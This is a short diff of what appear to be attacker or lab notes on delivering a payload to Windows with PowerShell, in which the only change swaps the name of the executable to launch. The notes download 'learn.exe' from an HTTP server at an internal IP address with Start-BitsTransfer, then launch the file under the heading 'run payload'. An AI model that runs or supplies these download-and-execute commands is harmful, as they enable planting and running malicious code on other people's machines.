@@ -26,7 +26,7 @@ create powershell in windows
 Start-BitsTransfer -Source "http://10.8.249.117:8081/learn.exe" -d "c:\users"
 
 run payload 
-powershell -c Start-Process "learn3.exe"
+powershell -c Start-Process "learn2.exe"
 
  
  
